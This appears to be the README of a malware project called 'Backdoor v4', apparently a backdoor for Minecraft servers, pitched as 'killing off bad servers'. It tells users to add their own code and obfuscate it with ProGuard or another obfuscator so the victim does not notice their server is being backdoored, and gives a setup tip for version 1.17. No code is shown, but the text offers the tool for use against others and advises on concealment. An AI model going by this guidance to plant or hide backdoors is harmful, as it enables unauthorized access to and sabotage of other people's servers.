## Backdoor v4

Killing off bad servers made easy

Add your own code wherever you want and then
obfuscate it with [proguard](https://www.guardsquare.com/en/products/proguard) or
[superblaubeere27's obfuscator](https://github.com/superblaubeere27/obfuscator)
is really good too but it doesn't rename public fields or methods  
Obfuscation is not required, it just makes it harder for the victim
to realize that their server is being back doored.  
If you are running 1.17 remember to set debug to false in Main.java.
